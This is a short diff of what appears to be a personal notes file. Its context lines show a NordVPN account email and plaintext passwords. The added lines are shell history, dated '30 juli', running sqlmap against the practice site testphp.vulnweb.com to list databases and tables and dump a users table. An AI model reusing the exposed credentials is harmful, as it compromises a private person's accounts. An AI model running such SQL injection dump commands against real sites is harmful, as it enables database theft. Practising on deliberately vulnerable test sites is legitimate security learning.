@@ -791,3 +791,12 @@ Password: El0nmusk
 NORDVPN
 User: melzer.joachim@gmail.com
 Password: Janahase06
+
+
+
+-------------------------
+30 juli
+sqlmap -h
+   74  sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+   75  sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 acuart -tables
+   76  sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 acuart --tables users --dump
